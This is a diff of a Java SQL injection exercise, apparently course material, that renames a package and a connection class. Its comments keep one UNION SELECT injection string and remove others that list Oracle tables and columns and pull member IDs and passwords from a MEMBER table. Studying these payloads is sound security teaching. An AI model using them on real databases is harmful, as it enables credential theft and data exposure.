@@ -1,4 +1,4 @@
-package secure.exam;
+package encryption.sec03;
 
 import java.sql.Connection;
 import java.sql.PreparedStatement;
@@ -8,7 +8,7 @@ import java.util.Scanner;
 public class StudentInjectMain {
 	public static void main(String[] args) {
 		//DB 연결
-		DBConnect dbCon = new DBConnect();
+		DBConn dbCon = new DBConn();
 		Connection con = dbCon.getConnection();
 		PreparedStatement pstmt = null;
 		ResultSet rs = null;
@@ -59,19 +59,6 @@ public class StudentInjectMain {
 /// 
 /// book 테이블의 데이터 출력
 /// ' UNION SELECT bookNo, bookName, bookPrice, bookAuthor, bookDate, pubNo FROM book --
-/// 
-/// 
-/// 'or 1=1 union select table_name, null,null,null,null,null from user_tables --
-/// 
-/// 'or 1=1 union select table_name, null,null,null,null,null from user_tables -- 
-/// 
-/// 'or 1=1 union select column_name, null,null,null,null,null from all_tab_columns where table_name='MEMBER' --
-/// 
-/// 
-/// 'or 1=1 union select column_name, data_type,null,null,null,null from all_tab_columns where table_name='MEMBER' --
-/// 
-/// 
-/// ' or 1=1 union select memid, mempwd, null, null, null, null from MEMBER --
 
 
 
